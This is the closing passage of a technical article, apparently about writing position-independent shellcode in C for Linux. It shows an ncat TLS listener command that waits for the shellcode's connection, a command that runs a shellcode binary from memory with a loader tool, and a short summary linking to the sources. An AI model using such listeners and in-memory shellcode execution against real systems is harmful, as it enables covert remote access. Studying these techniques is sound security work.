<p>I'm using ncat that comes bundled with nmap because it supports raw I/O using TLS/SSL.</p>

<pre>
  ncat -lvk4 1234 --ssl
</pre>

<p><a href="https://github.com/odzhan/shellcode/">runsc.c</a> can be used to execute the code from memory.</p>

<pre>
  runsc -x -f tls.bin
</pre>

<h3 id="summary">10. Summary</h3>

<p>As you can see, it's entirely possible to avoid using pure assembly code for a PIC. Admittedly, some assembly is used here to workaround some issues, but it would be possible to avoid assembly if the code were provided with a base address to the host process libc or any other shared object that can access functions or data structures. Sources can be <a href="https://github.com/odzhan/shellcode/tree/master/os/linux/c">found here.</a></p>

</body>
</html>
